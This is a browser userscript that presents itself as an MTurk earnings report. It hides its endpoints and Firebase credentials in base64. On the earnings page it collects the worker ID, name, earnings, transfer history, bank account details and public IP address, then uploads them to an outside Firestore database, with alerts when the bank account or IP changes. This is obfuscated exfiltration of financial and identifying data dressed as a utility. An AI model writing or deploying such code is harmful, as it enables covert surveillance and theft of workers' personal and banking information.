// ==UserScript==
// @name         🔒 MTurk Earnings Report
// @namespace    ab2soft.secure
// @version      5.4-obf-stable
// @match        https://worker.mturk.com/earnings*
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==

(async () => {
  'use strict';


  const _b64d = s => atob(s);
  const _u8   = s => new TextEncoder().encode(s);
  const _hex  = a => Array.from(new Uint8Array(a)).map(b => b.toString(16).padStart(2,'0')).join('');
  const _sha256 = async s => _hex(await crypto.subtle.digest('SHA-256', _u8(s)));


  const PASS_HASH = _b64d("OWI3MjRkOWRmOTdhOTFkMjk3ZGMxYzcxNGEzOTg3MzM4ZWJiNjBhMmE1MzMxMWQyZTM4MjQxMWE3OGI5ZTA3ZA==");



  const FIREBASE_APP_URL  = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWFwcC5qcw==");
  const FIRESTORE_URL     = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWZpcmVzdG9yZS5qcw==");
  const SHEET_CSV         = _b64d("aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVl0bXI3ZEhTQXY2OU4yN3VaY3JoS2FFZXJMOFdoek1DSTAydnVncV9DX00vZXhwb3J0P2Zvcm1hdD1jc3YmZ2lkPTA=");


  const FIREBASE_CFG = JSON.parse(_b64d(
    "eyJwcm9qZWN0SWQiOiJtdHVyay1tb25pdG9yZGVlcCIsImFwaUtleSI6IkFJemFTeUNDdEJDQUp2UUNEajhNWGIydzkwcVlVcVJyRU5JSUdJUSIsImF1dGhEb21haW4iOiJtdHVyay1tb25pdG9yZGVlYy5maXJlYmFzZWFwcC5jb20iLCJzdG9yYWdlQnVja2V0IjoibXR1cmstbW9uaXRvcmRlZXAuZmlyZWJhc2VzdG9yYWdlLmFwcCIsIm1lc3NhZ2luZ1NlbmRlcklkIjoiNTgzOTIyOTc0ODciLCJhcHBJZCI6IjE6NTgzOTIyOTc0ODc6d2ViOjEzNjVhZDEyMTEwZmZkMDU4NjYzN2EifQ=="
  ));


  const { initializeApp } = await import(FIREBASE_APP_URL);
  const { getFirestore, doc, getDoc, setDoc } = await import(FIRESTORE_URL);
  const app = initializeApp(FIREBASE_CFG);
  const db  = getFirestore(app);


  function getWorkerId() {
    const el = document.querySelector("[data-react-props*='textToCopy']");
    if (el) {
      try {
        const j = JSON.parse(el.getAttribute("data-react-props").replace(/&quot;/g,'"'));
        if (j.textToCopy) return j.textToCopy.trim();
      } catch {}
    }
    return document.querySelector(".me-bar .text-uppercase span")?.textContent.trim() || "";
  }


  function extractNextTransferInfo() {
    const strongTag = Array.from(document.querySelectorAll("strong"))
      .find(el => /transferred to your bank account/i.test(el.textContent));
    let bankAccount = "", nextTransferDate = "";
    if (strongTag) {
      const bankLink = strongTag.querySelector("a[href*='direct_deposit']");
      if (bankLink) bankAccount = bankLink.textContent.trim();
      const text = strongTag.textContent.replace(/\s+/g, " ");
      const m = text.match(/on\s+([A-Za-z]{3,}\s+\d{1,2},\s+\d{4})\s+based/i);
      if (m) nextTransferDate = m[1].trim();
    }
    return { bankAccount, nextTransferDate };
  }


  async function extractData() {
    const html = document.body.innerHTML.replace(/\s+/g, " ");
    const workerId = getWorkerId();
    const userName = document.querySelector(".me-bar a[href='/account']")?.textContent.trim() || "";
    const currentEarnings = (html.match(/Current Earnings:\s*\$([\d.]+)/i) || [])[1] || "0.00";

    let lastTransferAmount = "", lastTransferDate = "", lastMonthEarnings = currentEarnings;
    try {
      const attr = document.querySelector('[data-react-class*="TransferHistoryTable"]')?.getAttribute("data-react-props");
      if (attr) {
        const parsed = JSON.parse(attr.replace(/&quot;/g, '"'));
        const body = parsed.bodyData || [];
        // latest transfer
        const last = body[0];
        if (last) {
          lastTransferAmount = last.amountRequested?.toString() || "";
          lastTransferDate = last.requestedDate || "";
        }
        // last month sum
        const now = new Date();
        const thisMonth = now.getMonth();
        const lastMonth = thisMonth === 0 ? 11 : thisMonth - 1;
        const lastMonthYear = thisMonth === 0 ? now.getFullYear() - 1 : now.getFullYear();

        const totalLastMonth = body.reduce((sum, t) => {
          const [mm, dd, yy] = (t.requestedDate||"").split("/").map(v=>v.trim());
          const y = 2000 + parseInt(yy || "0", 10);
          const m = (parseInt(mm || "0", 10) - 1);
          if (y === lastMonthYear && m === lastMonth) sum += (parseFloat(t.amountRequested)||0);
          return sum;
        }, 0);

        if (totalLastMonth > 1) lastMonthEarnings = totalLastMonth.toFixed(2);
      }
    } catch {}

    const { bankAccount, nextTransferDate } = extractNextTransferInfo();

    let ip = "unknown";
    try { ip = (await fetch("https://api.ipify.org?format=json").then(r=>r.json())).ip; } catch {}

    return { workerId, userName, currentEarnings, lastTransferAmount, lastTransferDate, nextTransferDate, bankAccount, ip, lastMonthEarnings };
  }


  async function loadSheet() {
    const res = await fetch(SHEET_CSV);
    const text = await res.text();
    const rows = text.split(/\r?\n/).map(r => r.split(","));
    const header = rows.shift().map(h=>h.trim());
    const wi = header.findIndex(h=>/worker.?id/i.test(h));
    const ui = header.findIndex(h=>/user|name/i.test(h));
    const map = {};
    for (const r of rows) {
      const w = (r[wi]||"").trim();
      const u = (r[ui]||"").trim();
      if (w && u) map[w]=u;
    }
    return map;
  }


  async function ensurePassword(workerId) {
    const key = `verified_${workerId}`;
    const ok = await GM_getValue(key, false);
    if (ok) { console.log(`🔓 ${workerId} verified`); return; }

    const entered = prompt(`🔒 Enter password for WorkerID ${workerId}:`);
    if (!entered) { alert("❌ Password required"); throw new Error("no password"); }
    const h = await _sha256(entered.trim());
    if (h !== PASS_HASH) { alert("❌ Incorrect password"); throw new Error("bad password"); }

    await GM_setValue(key, true);
    console.log(`✅ Password verified for ${workerId}`);
  }


  const data = await extractData();
  if (!data.workerId) { console.warn("⚠️ No WorkerID; abort"); return; }

  await ensurePassword(data.workerId);

  const userMap = await loadSheet();
  data.user = userMap[data.workerId] || data.userName || "Unknown";

  const { workerId } = data;
  const ref  = doc(db, "earnings_logs", workerId);
  const prev = await getDoc(ref);
  let alert = "✅ OK";

  if (prev.exists()) {
    const p = prev.data();


    if (p.alert && String(p.alert).startsWith("⚠️")) {
      console.log(`🚫 Locked by alert for ${workerId}`); return;
    }

    if (p.bankAccount && p.bankAccount !== data.bankAccount) alert = "⚠️ Bank Changed";
    if (p.ip && p.ip !== data.ip)               alert = "⚠️ IP Changed";

    const keys = ["currentEarnings","lastTransferAmount","lastTransferDate","nextTransferDate","bankAccount","ip","lastMonthEarnings"];
    const changed = keys.some(k => (p[k]||"") !== (data[k]||""));
    if (!changed && alert === p.alert) {
      console.log("⏸️ No change; skip write"); return;
    }
  }

  if (alert.startsWith("⚠️")) {
    try { new Audio("https://www.allbyjohn.com/sounds/mturkscanner/lessthan15Short.mp3").play(); } catch {}
  }

  await setDoc(ref, { ...data, alert, timestamp: new Date() });
  console.log(`[MTurk→Firebase] ✅ Synced ${workerId} (${alert})`);
})();
